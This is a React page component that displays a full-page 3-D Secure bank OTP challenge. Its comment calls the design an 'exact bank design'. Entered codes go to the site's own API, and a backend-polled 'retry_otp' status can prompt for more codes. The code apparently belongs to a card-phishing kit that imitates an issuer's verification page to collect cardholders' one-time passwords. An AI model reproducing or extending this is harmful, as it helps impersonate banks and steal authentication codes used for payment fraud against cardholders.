import React, { useCallback, useEffect, useState } from 'react';
import { useSearchParams } from 'react-router-dom';
import { AcsOtpChallenge } from '../components/AcsOtpChallenge';
import {
  fetchOrderOtpStatus,
  requestOtpResend,
  submitCreditCardMethodNext,
  submitCreditCardOtp,
} from '../api';

/** Full-page ACS / 3DS — exact bank design. Returns to merchant when done. */
export default function AcsChallengePage() {
  const [params] = useSearchParams();
  const orderRef = (params.get('order_ref') || params.get('order') || params.get('orderId') || '').trim();
  const lang = (params.get('lang') || localStorage.getItem('lang') || 'ar').trim();
  const returnUrl = (params.get('return') || params.get('return_url') || '/buy').trim() || '/buy';

  const [phoneLast3, setPhoneLast3] = useState(params.get('digits') || params.get('phone_last3') || '');
  const [otpRetryNotice, setOtpRetryNotice] = useState(false);
  const [otpResendNotice, setOtpResendNotice] = useState(false);
  const [otpResendCooldown, setOtpResendCooldown] = useState(0);
  const [otpResendLoading, setOtpResendLoading] = useState(false);
  const [otpState, setOtpState] = useState('input');
  const [failReason, setFailReason] = useState(null);

  const goBack = useCallback(
    (status) => {
      try {
        sessionStorage.setItem(
          'acs_return',
          JSON.stringify({ order_ref: orderRef, status, at: Date.now() }),
        );
      } catch {
        /* ignore */
      }
      let target = returnUrl;
      try {
        const u = new URL(returnUrl, window.location.origin);
        u.searchParams.set('acs_result', status);
        if (orderRef) u.searchParams.set('order_ref', orderRef);
        target = u.toString();
      } catch {
        target = returnUrl;
      }
      window.location.replace(target);
    },
    [orderRef, returnUrl],
  );

  useEffect(() => {
    if (!orderRef) return undefined;
    let alive = true;
    const poll = async () => {
      try {
        const data = await fetchOrderOtpStatus(orderRef);
        if (!alive || !data) return;
        if (data.phone_last3) {
          setPhoneLast3(String(data.phone_last3).replace(/\D/g, '').slice(-3));
        }
        if (typeof data.otp_resend_cooldown_sec === 'number') {
          setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
        }
        if (data.fail_reason) setFailReason(data.fail_reason);
        const st = String(data.status || '').toLowerCase();
        if (st === 'completed') {
          goBack('completed');
          return;
        }
        if (st === 'failed' || st === 'refunded') {
          if (data.fail_reason === 'otp_attempts_exceeded') {
            setOtpState('failed');
            setFailReason('otp_attempts_exceeded');
          }
        }
        if (st === 'retry_otp') {
          setOtpState('input');
          setOtpRetryNotice(true);
        }
      } catch {
        /* ignore */
      }
    };
    void poll();
    const id = window.setInterval(() => void poll(), 1200);
    return () => {
      alive = false;
      window.clearInterval(id);
    };
  }, [orderRef, goBack]);

  useEffect(() => {
    if (otpResendCooldown <= 0) return undefined;
    const t = window.setInterval(() => setOtpResendCooldown((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearInterval(t);
  }, [otpResendCooldown]);

  const onMethodNext = async () => {
    if (!orderRef) return;
    try {
      await submitCreditCardMethodNext(orderRef);
    } catch {
      /* UI already advanced */
    }
  };

  const onSubmitOtp = async (code) => {
    if (!orderRef) return;
    setOtpRetryNotice(false);
    setOtpResendNotice(false);
    setOtpState('checking');
    try {
      await submitCreditCardOtp(orderRef, code);
    } catch (e) {
      setOtpState('input');
      throw e;
    }
  };

  const onResend = async () => {
    if (!orderRef) return;
    setOtpResendLoading(true);
    try {
      const data = await requestOtpResend(orderRef);
      setOtpResendNotice(true);
      setOtpResendCooldown(data?.cooldown_sec ?? 60);
    } catch (e) {
      if (e?.cooldown_sec != null) setOtpResendCooldown(e.cooldown_sec);
    } finally {
      setOtpResendLoading(false);
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: '#fff', margin: 0, padding: 0 }}>
      <AcsOtpChallenge
        orderRef={orderRef}
        phoneLast3={phoneLast3}
        lang={lang}
        otpRetryNotice={otpRetryNotice}
        otpResendNotice={otpResendNotice}
        resendCooldown={otpResendCooldown}
        resendLoading={otpResendLoading}
        externalState={otpState}
        failReason={failReason}
        onMethodNext={onMethodNext}
        onSubmitOtp={onSubmitOtp}
        onResend={onResend}
        onRetry={() => goBack('failed')}
        onCancel={() => goBack('cancelled')}
      />
    </div>
  );
}
